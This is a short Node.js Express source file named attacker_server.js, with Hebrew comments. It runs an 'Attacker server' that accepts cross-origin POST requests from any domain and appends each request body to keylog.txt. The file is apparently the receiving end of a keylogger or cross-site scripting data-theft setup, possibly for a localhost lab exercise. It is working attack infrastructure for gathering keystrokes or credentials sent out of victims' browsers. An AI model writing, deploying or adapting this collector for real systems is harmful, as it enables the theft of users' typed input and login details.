// attacker_server.js
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();
const PORT = 4000;

app.use(cors()); // ✅ אפשר כל דומיין
app.use(express.json()); // ✅ כדי לקרוא JSON ב-body

app.post("/log", (req, res) => {
  const data = JSON.stringify(req.body);
  const timestamp = new Date().toISOString();
  fs.appendFile("keylog.txt", `${timestamp} - ${data}\n`, (err) => {
    if (err) {
      console.error("Failed to log data", err);
      return res.status(500).send("Error");
    }
    console.log("Logged:", data);
    res.send("Logged");
  });
});

app.listen(PORT, () => {
  console.log(`🛡️ Attacker server running on http://localhost:${PORT}`);
});
